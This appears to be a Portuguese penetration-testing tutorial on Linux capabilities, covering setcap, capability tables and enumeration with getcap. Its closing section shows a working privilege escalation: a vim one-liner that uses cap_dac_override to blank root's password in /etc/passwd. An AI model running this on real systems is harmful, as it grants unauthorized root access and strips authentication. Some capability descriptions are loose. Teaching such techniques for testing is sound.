Os Linux Capabilities permitem conceder privilégios específicos a processos, proporcionando um controle mais refinado e seguro do que o modelo tradicional Unix de concessão de privilégios.

No entanto, eles não são invulneráveis e podem ser explorados por invasores, especialmente se processos com capacidades não estiverem isolados adequadamente. O uso indevido ou excessivo de capabilities também pode criar riscos de segurança, pois pode conceder a processos mais privilégios do que necessário, aumentando o potencial de exploração. Portanto, é essencial usar capabilities do Linux com cuidado para evitar vulnerabilidades.

No Ubuntu, por exemplo, podemos usar o comando `setcap` para definir capabilities para executáveis ​​específicos. Este comando nos permite especificar a capability que queremos definir e o valor que queremos atribuir.

Por exemplo, poderíamos usar o seguinte comando para definir a capability `cap_net_bind_service` de um executável:

#### Set Capability
```shell-session
NycolasES6@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Ao definir capabilities para um binário, o binário será capaz de executar ações que não seria capaz de executar. Por exemplo, se a capability `cap_net_bind_service` for definida para um binário, o binário será capaz de se vincular a portas de rede, o que é um privilégio geralmente restrito.

Alguns recursos, como `cap_sys_admin`, que permite que um executável execute ações com privilégios administrativos, podem ser perigosos se não forem usados ​​corretamente.

| **Capability**         | **Descrição**                                                                                                                                                                |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_sys_admin`        | Permite executar ações com privilégios administrativos, como modificar arquivos do sistema ou alterar configurações do sistema.                                              |
| `cap_sys_chroot`       | Permite alterar o diretório raiz do processo atual, permitindo que ele acesse arquivos e diretórios que, de outra forma, seriam inacessíveis.                                |
| `cap_sys_ptrace`       | Permite anexar e depurar outros processos, potencialmente permitindo que ele obtenha acesso a informações confidenciais ou modifique o comportamento de outros processos.    |
| `cap_sys_nice`         | Permite aumentar ou diminuir a prioridade dos processos, permitindo potencialmente obter acesso a recursos que, de outra forma, seriam restritos.                            |
| `cap_sys_time`         | Permite modificar o relógio do sistema, o que pode permitir que ele manipule registros de data e hora ou faça com que outros processos se comportem de maneiras inesperadas. |
| `cap_sys_resource`     | Permite modificar os limites de recursos do sistema, como o número máximo de descritores de arquivos abertos ou a quantidade máxima de memória que pode ser alocada.         |
| `cap_sys_module`       | Permite carregar e descarregar módulos do kernel, o que pode permitir modificar o comportamento do sistema operacional ou obter acesso a informações confidenciais.          |
| `cap_net_bind_service` | Permite vincular-se a portas de rede, o que lhe permite obter acesso a informações confidenciais ou executar ações não autorizadas.                                          |

Quando um binário é executado com capabilities, ele pode executar as ações que as capabilities permitem. No entanto, ele não poderá executar nenhuma ação não permitida pelas capabilities. Isso permite um controle mais refinado sobre os privilégios do binário e pode ajudar a evitar vulnerabilidades de segurança e acesso não autorizado a informações confidenciais.

Ao usar o comando `setcap` para definir capabilities para um executável no Linux, precisamos especificar a capability que queremos definir e o valor que queremos atribuir. Os valores que usamos dependerão da capability específica que estamos definindo e dos privilégios que queremos conceder ao executável.

Aqui estão alguns exemplos de valores que podemos usar com o comando `setcap`, juntamente com uma breve descrição do que eles fazem:

| **Valores de Capability** | **Descrição**                                                                                                                                                                                                                                                                                                                                                                                                  |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`                       | Este valor define a capability especificada para o executável, mas não concede nenhum privilégio. Isso pode ser útil se quisermos limpar uma capacidade definida anteriormente para o executável.                                                                                                                                                                                                              |
| `+ep`                     | Este valor concede os privilégios efetivos e permitidos para a capability especificada ao executável. Isso permite que o executável execute as ações que a capability permite, mas não permite que ele execute quaisquer ações que não sejam permitidas pela capacidade.                                                                                                                                       |
| `+ei`                     | Este valor concede privilégios suficientes e herdáveis ​​para a capability especificada ao executável. Isso permite que o executável execute as ações que a capability permite e que os processos filhos gerados pelo executável herdem a capability e executem as mesmas ações.                                                                                                                               |
| `+p`                      | Este valor concede os privilégios permitidos para a capability especificada ao executável. Isso permite que o executável execute as ações que a capability permite, mas não permite que ele execute nenhuma ação que não seja permitida pela capability. Isso pode ser útil se quisermos conceder a capability ao executável, mas impedir que ele herde a capacidade ou permita que processos filhos a herdem. |

Vários recursos do Linux podem ser usados ​​para escalar os privilégios de um usuário para `root`, incluindo:

| **Capability**     | **Descrição**                                                                                                                                                                                                                          |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Permite que um processo defina seu ID de usuário efetivo, que pode ser usado para obter os privilégios de outro usuário, incluindo o `root`usuário.                                                                                    |
| `cap_setgid`       | Permite definir seu ID de grupo efetivo, que pode ser usado para obter privilégios de outro grupo, incluindo o `root`grupo.                                                                                                            |
| `cap_sys_admin`    | Esse capability fornece uma ampla gama de privilégios administrativos, incluindo a capacidade de executar muitas ações reservadas ao `root`usuário, como modificar configurações do sistema e montar e desmontar sistemas de arquivos. |
| `cap_dac_override` | Permite ignorar verificações de permissão de leitura, gravação e execução de arquivos.                                                                                                                                                 |

## Enumeração de capabilities
Esses recursos devem ser usados ​​com cautela e concedidos somente a processos confiáveis, pois podem ser mal utilizados para obter acesso não autorizado ao sistema.

Para enumerar todos os recursos existentes para todos os executáveis ​​binários existentes em um sistema Linux, podemos usar o seguinte comando:

#### Enumerando Capacidades
```shell-session
NycolasES6@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Este one-liner usa o comando `find` para procurar todos os executáveis ​​binários nos diretórios onde eles estão tipicamente localizados e então usa o sinalizador `-exec` para executar o comando `getcap` em cada um, mostrando os recursos que foram definidos para aquele binário.

## Exploração
Se obtivermos acesso ao sistema com uma conta de baixo privilégio, descobriremos a capability `cap_dac_override` :

### Explorando Capabilities
```shell-session
NycolasES6@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

Por exemplo, o binário `/usr/bin/vim.basic` é executado sem privilégios especiais, como com `sudo`. No entanto, como o binário tem o conjunto de capacidades `cap_dac_override`, ele pode escalar os privilégios do usuário que o executa. 

Isso permitiria que o testador de penetração ganhasse a capability `cap_dac_override` e executasse tarefas que exigem essa capability.

Vamos dar uma olhada no arquivo `/etc/passwd` onde o usuário `root` é especificado:

```shell-session
NycolasES6@htb[/htb]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

Podemos usar a capability `cap_dac_override` do `/usr/bin/vim` binário para modificar um arquivo de sistema:

```shell-session
NycolasES6@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```

Também podemos fazer essas alterações em um modo não interativo:

```shell-session
NycolasES6@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
NycolasES6@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

Agora, podemos ver que o `x` naquela linha desapareceu, o que significa que podemos usar o comando `su` para efetuar login como root sem que seja solicitada a senha.
